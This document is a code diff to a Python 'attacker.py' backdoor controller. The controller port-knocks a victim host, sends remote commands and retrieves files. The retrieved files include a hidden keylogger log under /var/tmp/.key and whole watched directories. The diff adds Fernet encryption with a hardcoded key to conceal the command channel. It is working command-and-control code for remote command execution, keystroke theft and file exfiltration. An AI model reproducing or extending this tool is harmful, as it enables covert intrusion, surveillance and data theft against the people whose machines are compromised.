@@ -1,4 +1,6 @@
 import ipaddress
+
+from cryptography.fernet import Fernet
 from scapy.all import *
 from scapy.layers.inet import IP, TCP
 import socket
@@ -8,10 +10,13 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock.connect(("8.8.8.8", 80))
 my_ip = sock.getsockname()[0]
 sock.close()
+fernet = Fernet(b'JFMnqwIgPTu1BqhqtCN4uPx2d6noxOcXtAbxJB5FrIQ=')
+
 
 def knock(victimIP):
-    send(IP(dst=victimIP)/TCP(sport=14369, dport=19634, flags='S'))
-    send(IP(dst=victimIP)/TCP(sport=13436, dport=16343, flags='S'))
+    send(IP(dst=victimIP) / TCP(sport=14369, dport=19634, flags='S'))
+    send(IP(dst=victimIP) / TCP(sport=13436, dport=16343, flags='S'))
+
 
 def is_ipv4(string):
     try:
@@ -93,7 +98,8 @@ def print_menu():
     print("4: execute command")
     print("5: exit")
 
-def main_menu(victimIP):
+
+def main_menu():
     while True:
         print_menu()
         selection = input()
@@ -111,27 +117,59 @@ def main_menu(victimIP):
         else:
             print(f"err {selection} not found")
 
-def get_file(fileName, connection):
-    with client, client.makefile('rb') as clientfile:
-        filename = clientfile.readline().strip().decode()
-        length = int(clientfile.readline())
-        print(f'Downloading {filename}:{length}...')
-        # Read the data in chunks so it can handle large files.
-        with open(filename, 'wb') as f:
-            while length:
-                chunk = min(length, 4096)
-                data = clientfile.read(chunk)
-                if not data: break  # socket closed
-                f.write(data)
-                length -= len(data)
 
-        if length != 0:
-            print('Invalid download.')
-        else:
-            print('Done.')
+# decrypt and decode
+def dd(msg):
+    return fernet.decrypt(msg).decode()
+
+
+def get_file(connection):
+    file = connection.recv(4096)
+    le = connection.recv(4096)
+    filename = dd(trim_message(file.decode()))
+    length = int(dd(trim_message(le.decode())))
+    print(f'Downloading {filename}:{length}...')
+    os.makedirs("files", exist_ok=True)
+    f = open("files/" + os.path.split(filename)[-1], 'wb')
+    while length:
+        chunk = min(length, 4096)
+        data = connection.recv(chunk)
+        if not data: break
+        f.write(data)
+        length -= len(data)
+    if length != 0:
+        print('Invalid download.')
+    else:
+        print('Done.')
+    f.close()
+
 
 def get_directory(fileName, connection):
-    pass
+    while True:
+        filename = dd(trim_message(connection.recv(4096)))
+        if filename == "-done-":
+            break
+        length = int(dd(trim_message(connection.recv(4096))))
+        print(f'Downloading {filename}...\n  Expecting {length:,} bytes...', end='', flush=True)
+        path = os.path.join('watched', filename)
+        os.makedirs(os.path.dirname(path), exist_ok=True)
+        with open(path, 'wb') as f:
+            while length:
+                chunk = min(length, 4096)
+                data = connection.recv(chunk)
+                if not data: break
+                f.write(data)
+                length -= len(data)
+            else:
+                print('Complete')
+                continue
+
+        print('Incomplete')
+        break
+
+
+def trim_message(msg):
+    return msg.split()[-1]
 
 
 if __name__ == '__main__':
@@ -142,7 +180,7 @@ if __name__ == '__main__':
         print("example: attacker.py 192.168.0.1")
         exit()
 
-    if(not is_ipv4(victimIp)):
+    if (not is_ipv4(victimIp)):
         print("please use a valid IP address")
         print("example: attacker.py 192.168.0.1")
 
@@ -158,20 +196,18 @@ if __name__ == '__main__':
     print(f'Client joined from {address}')
     with client:
         while True:
-            command = main_menu(client_ip)
+            command = main_menu()
             while command == "-1":
-                command = main_menu(client_ip)
+                command = main_menu()
             if command == "exit":
                 break
             command_type = command.split()[0]
-            client.sendall(str(command).encode())
-            if command_type == "kget":
-                get_file("/var/tmp/.key/log.txt", client)
-            elif command_type == "fget":
-                get_file(" ".join(command.split()[1:]), client)
+            client.sendall(fernet.encrypt(str(command).encode()))
+            if command_type == "kget" or command_type == "fget":
+                get_file(client)
             elif command_type == "wget":
                 get_directory(" ".join(command.split()[1:]), client)
             else:
-                data = client.recv(4096)
-                print(data.decode())
-
+                data = client.recv(4096).decode()
+                data = trim_message(data)
+                print(dd(data.encode()))
